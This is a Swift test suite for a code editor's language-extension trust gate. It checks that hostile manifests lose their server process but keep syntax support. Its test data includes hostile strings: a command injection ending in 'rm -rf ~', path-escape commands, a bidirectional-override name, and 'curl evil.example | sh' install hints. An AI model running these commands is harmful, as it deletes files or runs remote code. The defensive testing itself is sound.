import Foundation
@testable import Ghostty
import Testing

/// What a contributed language keeps when its server is withheld.
///
/// The rule under test is the one that makes "Don't Run" a usable answer
/// rather than a broken editor: an extension contributes file types, a
/// display name, keywords and comment syntax **regardless of trust**, and
/// only the process waits. So every case here is a hostile manifest, and
/// every case asserts the same two things — the server is gone, and the
/// language is not.
///
/// Nothing here goes near a `Process`. Trust is a pure function of a
/// `Subject` and a record, and that is the level everything is asserted at;
/// a gate that could only be exercised by launching something is a gate
/// nobody would test twice.
struct UntrustedLanguageDegradationTests {
    private static let workspace = "/Users/x/project"

    private func manifest(
        id: String = "acme.elixir",
        name: String = "Elixir Pack",
        scope: LanguageManifest.Scope = .user,
        language: String
    ) -> LanguageManifest {
        let root = URL(fileURLWithPath: "/tmp/phantom-trust").appendingPathComponent(id)
        let json = #"""
        {
          "schemaVersion": 1,
          "id": "\#(id)",
          "name": "\#(name)",
          "version": "1.0.0",
          "publisher": "acme",
          "contributes": { "languages": [\#(language)] }
        }
        """#
        return LanguageManifest.parse(
            data: Data(json.utf8),
            url: root.appendingPathComponent(LanguageManifest.fileName),
            root: root,
            scope: scope
        )!
    }

    /// A whole language, minus whatever the caller replaces. The `server`
    /// block is the only thing that varies between these tests, so
    /// everything the language half is judged on is fixed here.
    private func elixir(server: String) -> String {
        #"""
        {
          "languageId": "elixir",
          "name": "Elixir",
          "extensions": ["ex", "exs"],
          "fileNames": ["mix.lock"],
          "keywords": ["defmodule", "defp"],
          "lineComment": "#",
          \#(server)
        }
        """#
    }

    private func catalog(_ manifest: LanguageManifest) -> LanguageCatalog {
        LanguageCatalog.resolve(manifests: [manifest], promotions: [])
    }

    /// Everything a `.ex` file still gets. Called by every test below rather
    /// than spelled out in each, because the point is that the answer does
    /// not vary with what the server half did.
    private func expectTheLanguageIsWhole(
        _ catalog: LanguageCatalog,
        sourceLocation: SourceLocation = #_sourceLocation
    ) throws {
        let byExtension = try #require(
            catalog.contribution(forFileName: "app.ex"),
            "an unapproved extension stopped claiming its own file type",
            sourceLocation: sourceLocation
        )
        #expect(byExtension.language.displayName == "Elixir", sourceLocation: sourceLocation)
        #expect(
            catalog.contribution(forFileName: "script.exs")?.language.languageID == "elixir",
            sourceLocation: sourceLocation
        )
        #expect(
            catalog.contribution(forFileName: "mix.lock")?.language.languageID == "elixir",
            sourceLocation: sourceLocation
        )

        let syntax = byExtension.language.syntax
        #expect(syntax.id == "elixir", sourceLocation: sourceLocation)
        #expect(syntax.keywords == ["defmodule", "defp"], sourceLocation: sourceLocation)
        #expect(syntax.lineComment == "#", sourceLocation: sourceLocation)
        #expect(!syntax.isBuiltIn, sourceLocation: sourceLocation)
    }

    // MARK: Hostile commands — refused outright, and the language stays

    /// The headline case. A command that only means what it says to a shell
    /// is refused at parse *and* at the gate, and the file it claims still
    /// highlights, still toggles comments and still completes from the words
    /// in the buffer — none of which ever needed a process.
    @Test func aShellShapedCommandCostsTheServerAndNotTheLanguage() throws {
        let hostile = "elixir-ls; rm -rf ~"
        let catalog = catalog(manifest(
            language: elixir(server: #""server": { "command": "\#(hostile)" }"#)
        ))

        let contributed = try #require(catalog.contributed.first)
        #expect(contributed.isActive)
        #expect(contributed.language.serverRejection == .unsafeCommand(hostile))
        #expect(contributed.language.server == nil)
        #expect(contributed.serverDefinition == nil)

        /// And again at the gate, which is where the last check before a
        /// process lives — a defence at one layer is one refactor from a
        /// defence at none.
        #expect(
            LanguageTrust.verdict(
                for: LanguageTrust.Subject(
                    origin: .manifest(contributed.provenance),
                    digest: contributed.provenance.digest,
                    command: hostile,
                    resolvedPath: "/opt/homebrew/bin/elixir-ls",
                    workspaceRoot: Self.workspace
                ),
                record: nil
            ) == .deny(.unsafeCommand)
        )

        try expectTheLanguageIsWhole(catalog)
    }

    /// A path out of the extension's own directory. The server is launched
    /// with the workspace as its working directory, so a relative path is
    /// the freshly-cloned-repository attack in a different hat.
    @Test func aPathEscapingTheDirectoryCostsTheServerAndNotTheLanguage() throws {
        for escape in ["../../../usr/bin/evil", "./bin/evil", "/opt/tools/../../etc/evil"] {
            let catalog = catalog(manifest(
                language: elixir(server: #""server": { "command": "\#(escape)" }"#)
            ))

            let contributed = try #require(catalog.contributed.first)
            #expect(
                contributed.language.serverRejection == .unsafeCommand(escape),
                "\(escape) was accepted as a command"
            )
            #expect(contributed.serverDefinition == nil)

            try expectTheLanguageIsWhole(catalog)
        }
    }

    /// `PATH` is not the manifest's to trust. Plenty of shells put
    /// `./node_modules/.bin` on it, so an innocent-looking name plus a
    /// repository that ships the binary is arbitrary code — refused rather
    /// than asked, and refused even for an extension already approved.
    @Test func aCommandResolvingInsideTheWorkspaceCostsTheServerAndNotTheLanguage() throws {
        let catalog = catalog(manifest(
            language: elixir(server: #""server": { "command": "elixir-ls" }"#)
        ))
        let contributed = try #require(catalog.contributed.first)
        let inside = Self.workspace + "/node_modules/.bin/elixir-ls"

        let subject = LanguageTrust.Subject(
            origin: .manifest(contributed.provenance),
            digest: contributed.provenance.digest,
            command: "elixir-ls",
            resolvedPath: inside,
            workspaceRoot: Self.workspace
        )
        let approved = LanguageTrust.record(for: subject, decision: .allowed)
        #expect(
            LanguageTrust.verdict(for: subject, record: approved)
                == .deny(.commandInsideWorkspace(path: inside))
        )

        try expectTheLanguageIsWhole(catalog)
    }

    // MARK: Hostile display strings

    /// A right-to-left override in a name reverses the text after it, which
    /// is how a dialog or a banner is made to display one thing while
    /// something else is approved. The escape happens once, at the parse, so
    /// that every place that draws the name is covered — including the ones
    /// that draw it with a plain `Text`.
    @Test func aNameWithABidirectionalOverrideIsEscapedAndTheLanguageStillLoads() throws {
        let catalog = catalog(manifest(
            name: "Elixir\u{202E} Pack",
            language: #"""
            {
              "languageId": "elixir",
              "name": "Eli\#u{202E}xir",
              "extensions": ["ex", "exs"],
              "fileNames": ["mix.lock"],
              "keywords": ["defmodule", "defp"],
              "lineComment": "#",
              "server": { "command": "elixir-ls" }
            }
            """#
        ))

        let contributed = try #require(catalog.contributed.first)
        #expect(!contributed.extensionName.unicodeScalars.contains("\u{202E}"))
        #expect(contributed.extensionName.contains("\\u{202E}"))
        #expect(!contributed.language.displayName.unicodeScalars.contains("\u{202E}"))
        #expect(contributed.language.displayName.contains("\\u{202E}"))

        /// The definition handed to a banner carries the escaped name too —
        /// the banner draws `displayName` directly.
        let definition = try #require(contributed.serverDefinition)
        #expect(!definition.displayName.unicodeScalars.contains("\u{202E}"))

        /// The language is untouched by any of that: it still claims its
        /// files and still lexes.
        #expect(catalog.contribution(forFileName: "app.ex")?.language.languageID == "elixir")
        #expect(contributed.language.syntax.keywords == ["defmodule", "defp"])
    }

    /// The install hint is shown beside a "not installed" banner and can be
    /// copied to the pasteboard. A newline in it would add a line the
    /// manifest controls, next to text the reader takes as the app's.
    @Test func anInstallHintCannotAddALineToABanner() throws {
        let catalog = catalog(manifest(
            language: elixir(server: #"""
            "server": {
              "command": "elixir-ls",
              "installHint": "brew install elixir-ls\nRun: curl evil.example | sh"
            }
            """#)
        ))

        let definition = try #require(catalog.contributed.first?.serverDefinition)
        #expect(!definition.installHint.contains("\n"))
        #expect(definition.installHint.contains("\\u{A}"))

        try expectTheLanguageIsWhole(catalog)
    }

    /// Nothing a manifest wrote may reach the Install button, which is the
    /// one place in this app where a string becomes `$SHELL -lic`.
    ///
    /// The interesting half is the second manifest: it names a command the
    /// registry has an uninstall recipe for, so a definition judged by its
    /// `command` alone would hand back `rustup component remove …` for a
    /// language a file on disk invented. Judged by `origin`, it hands back
    /// nothing.
    @Test func aContributedServerNamesNoShellCommandForSettingsToRun() throws {
        for command in ["elixir-ls", "rust-analyzer"] {
            let catalog = catalog(manifest(
                language: elixir(server: #"""
                "server": {
                  "command": "\#(command)",
                  "installHint": "curl evil.example | sh"
                }
                """#)
            ))
            let definition = try #require(catalog.contributed.first?.serverDefinition)

            /// Nil rather than empty, which is the stronger claim: an empty
            /// string still renders a button, and a caller that forgot to
            /// check would run nothing while looking like it ran something.
            #expect(definition.installCommand == nil, "\(command) offered an install command")
            #expect(definition.uninstallCommand == nil, "\(command) offered an uninstall command")

            /// The hint itself survives — it is shown and copied, which is
            /// what it is for. Only its promotion to something Phantom runs
            /// is refused.
            #expect(definition.installHint == "curl evil.example | sh")
        }

        /// And the compiled-in servers still have theirs, or the guard would
        /// have taken the feature with it.
        let builtIn = try #require(LSPServerRegistry.server(forLanguage: "rust"))
        #expect(builtIn.installCommand?.isEmpty == false)
        #expect(builtIn.uninstallCommand != nil)
    }

    // MARK: The ordinary refusal

    /// Nothing hostile at all — a legitimate extension whose server the
    /// reader has not approved, or has refused. This is the case the whole
    /// design is for, and the one that has to stay comfortable: the answer
    /// costs the file its server and nothing else.
    @Test func anUnapprovedAndThenRefusedServerLeavesAWholeLanguage() throws {
        let catalog = catalog(manifest(
            language: elixir(server: #""server": { "command": "elixir-ls" }"#)
        ))
        let contributed = try #require(catalog.contributed.first)

        /// The definition exists — the language *has* a server — and it
        /// carries the provenance the gate reads, which is what stops it
        /// reaching a process without one.
        let definition = try #require(contributed.serverDefinition)
        #expect(definition.origin == .manifest(contributed.provenance))

        let subject = LanguageTrust.Subject(
            origin: definition.origin,
            digest: contributed.provenance.digest,
            command: definition.command,
            resolvedPath: "/opt/homebrew/bin/elixir-ls",
            workspaceRoot: Self.workspace
        )

        #expect(LanguageTrust.verdict(for: subject, record: nil) == .ask(.firstRun))
        try expectTheLanguageIsWhole(catalog)

        let refused = LanguageTrust.record(
            for: subject,
            decision: .refused,
            at: Date(timeIntervalSince1970: 1_700_000_000)
        )
        #expect(
            LanguageTrust.verdict(for: subject, record: refused)
                == .deny(.refusedByUser(at: Date(timeIntervalSince1970: 1_700_000_000)))
        )
        try expectTheLanguageIsWhole(catalog)
    }

    /// A manifest this build cannot read the schema of keeps its language
    /// and loses its server, and the *gate* is not what did it — there is no
    /// definition for a gate to judge. Worth pinning next to the trust cases
    /// because it is the same outcome reached a different way, and a reader
    /// deciding "the server is missing, so trust must have refused" would be
    /// debugging the wrong thing.
    @Test func aManifestFromALaterSchemaKeepsItsLanguageToo() throws {
        let root = URL(fileURLWithPath: "/tmp/phantom-trust/acme.future")
        let json = #"""
        {
          "schemaVersion": 99,
          "id": "acme.future",
          "name": "Future",
          "version": "1.0.0",
          "publisher": "acme",
          "contributes": { "languages": [\#(elixir(server: #""server": { "command": "elixir-ls" }"#))] }
        }
        """#
        let manifest = try #require(LanguageManifest.parse(
            data: Data(json.utf8),
            url: root.appendingPathComponent(LanguageManifest.fileName),
            root: root,
            scope: .user
        ))

        let catalog = LanguageCatalog.resolve(manifests: [manifest], promotions: [])
        let contributed = try #require(catalog.contributed.first)
        #expect(contributed.serverDefinition == nil)
        #expect(
            contributed.language.serverRejection
                == .ineligible(.needsNewerApp(declared: "99"))
        )

        try expectTheLanguageIsWhole(catalog)
    }
}

/// Where the gate sits, read out of the source rather than asserted about.
///
/// The same technique `EditorEngineBoundaryTests` uses, and for the same
/// reason: this is a promise about the *shape* of the code, and a promise
/// like that is kept by a test that reads it or not at all.
struct LanguageTrustGatePlacementTests {
    private var lspDirectory: URL {
        URL(fileURLWithPath: #filePath)          // …/macos/Tests/Terminal/<this>.swift
            .deletingLastPathComponent()          // …/macos/Tests/Terminal
            .deletingLastPathComponent()          // …/macos/Tests
            .deletingLastPathComponent()          // …/macos
            .appendingPathComponent("Sources/Features/Terminal/Editor/LSP")
    }

    private func sources() throws -> [URL] {
        try FileManager.default
            .contentsOfDirectory(at: lspDirectory, includingPropertiesForKeys: nil)
            .filter { $0.pathExtension == "swift" }
    }

    /// Comments are dropped before scanning, or every doc comment that
    /// *explains* the rule would satisfy it.
    private func code(in source: URL) throws -> String {
        try String(contentsOf: source, encoding: .utf8)
            .split(separator: "\n", omittingEmptySubsequences: false)
            .filter { line in
                let trimmed = line.trimmingCharacters(in: .whitespaces)
                return !trimmed.hasPrefix("//") && !trimmed.hasPrefix("*")
                    && !trimmed.hasPrefix("/*")
            }
            .joined(separator: "\n")
    }

    private func read(_ name: String) throws -> String {
        try code(in: lspDirectory.appendingPathComponent(name))
    }

    /// Guards the guard: a wrong path would make everything below pass by
    /// finding nothing.
    @Test func theDirectoryIsWhereWeThinkItIs() throws {
        let found = try sources()
        #expect(!found.isEmpty, "no LSP sources at \(lspDirectory.path)")
    }

    /// **The rule this whole suite exists for.**
    ///
    /// The gate has to be in the path before — or in the same commit as —
    /// the resolver, and never the resolver alone. Wiring the resolver first
    /// opens the path from a third-party manifest's `command` to
    /// `Process.run` with nothing asked in between, turning a dormant
    /// feature into a live one; wiring the gate first is inert, because a
    /// gate with no resolver behind it can only refuse launches that never
    /// arrive. Whoever does half of this job should be made to do the safe
    /// half, and this is what makes that mechanical rather than a matter of
    /// remembering.
    @Test func theResolverIsNeverWiredWithoutTheGate() throws {
        let center = try read("LSPCenter.swift")
        guard center.contains("LanguageResolver") else { return }

        #expect(
            center.contains("LanguageTrustGate.allowsLaunch"),
            """
            LSPCenter resolves servers through LanguageResolver, which lets a \
            manifest supply a command, but never calls LanguageTrustGate.allowsLaunch. \
            That is a path from a file in ~/.config to Process.run with nothing asked. \
            Put the gate back in server(for:definition:), or take the resolver out.
            """
        )
    }

    /// One door, so the gate is one line rather than a policy re-stated at
    /// each of the dozen places that ask for a server.
    @Test func exactlyOnePlaceBringsALanguageServerProcessIntoExistence() throws {
        var constructions: [String] = []
        var spawners: [String] = []
        for source in try sources() {
            let text = try code(in: source)
            if text.contains("LSPProcess(") { constructions.append(source.lastPathComponent) }
            if text.contains("Process()") { spawners.append(source.lastPathComponent) }
        }

        #expect(
            constructions.sorted() == ["LSPCenter.swift"],
            "a second place constructs an LSPProcess: \(constructions.sorted())"
        )
        #expect(
            spawners.sorted() == ["LSPProcess.swift"],
            "a second place spawns a process under Editor/LSP: \(spawners.sorted())"
        )
    }

    /// The gate is consulted where the process is made, not where a server
    /// is asked for. `didOpen`, hover, completion, rename and the
    /// availability sweep all arrive through `server(for:definition:)`; a
    /// check at each of them is a check the next caller is added without.
    @Test func theGateIsInsideTheFunctionThatStartsTheServer() throws {
        let center = try read("LSPCenter.swift")

        /// Anchored on a fragment of the signature rather than the whole
        /// declaration: the earlier version pinned `private func server(for
        /// key: Key` verbatim and broke the day the parameter list wrapped
        /// across lines, which is a test failing for a reformat instead of
        /// for the thing it guards. `for key: Key,` — with the comma — still
        /// belongs to this function alone.
        let start = try #require(center.range(of: "for key: Key,"))
        let body = center[start.upperBound...]
        /// `LSPProcess(` alone, for the reason the paragraph above gives
        /// about the other anchor. This one was `LSPProcess(definition:` and
        /// broke the day that call wrapped its arguments across lines — the
        /// gate had not moved, the formatting had. An anchor that includes a
        /// parameter name is an anchor that fails for a reformat.
        let construction = try #require(body.range(of: "LSPProcess("))
        let gate = try #require(body.range(of: "LanguageTrustGate.allowsLaunch"))

        #expect(
            gate.lowerBound < construction.lowerBound,
            "the trust gate runs after the process is constructed, which is not a gate"
        )
    }

    /// Trust lives in `UserDefaults`, deliberately not in the config
    /// directory — a decision stored next to the manifest is a decision the
    /// manifest's author can write.
    @Test func trustIsNotStoredWhereTheManifestAuthorCanWriteIt() throws {
        let store = try read("LanguageTrustStore.swift")
        #expect(store.contains("UserDefaults.standard"))
        #expect(!store.contains("extensionsDirURL"))
        #expect(!store.contains("GuiConfigStore"))
    }
}
